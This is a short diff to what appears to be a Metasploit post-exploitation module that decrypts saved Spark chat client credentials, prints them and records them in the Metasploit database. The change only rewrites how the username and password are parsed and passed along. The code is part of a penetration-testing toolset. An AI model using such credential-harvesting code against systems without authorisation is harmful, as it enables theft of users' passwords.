@@ -54,21 +54,21 @@ class Metasploit3 < Msf::Post
 
 		password = ::Rex::Text.to_utf8(password)
 
-		credentials = password.split("\u0001")
-		print_good("Decrypted Username #{credentials[0]} Password: #{credentials[1]}")
+		user, pass = password.scan(/[[:print:]]+/)
+		print_good("Decrypted Username #{user} Password: #{pass}")
 
-		store_creds(credentials)
+		store_creds(user, pass)
 	end
 
-	def store_creds(credentials)
+	def store_creds(user, pass)
 		if db
 			report_auth_info(
 				:host   => client.sock.peerhost,
 				:port   => 5222,
 				:ptype  => 'password',
 				:sname  => 'spark',
-				:user   => credentials[0],
-				:pass   => credentials[1],
+				:user   => user,
+				:pass   => pass,
 				:duplicate_ok => true,
 				:active => true
 			)
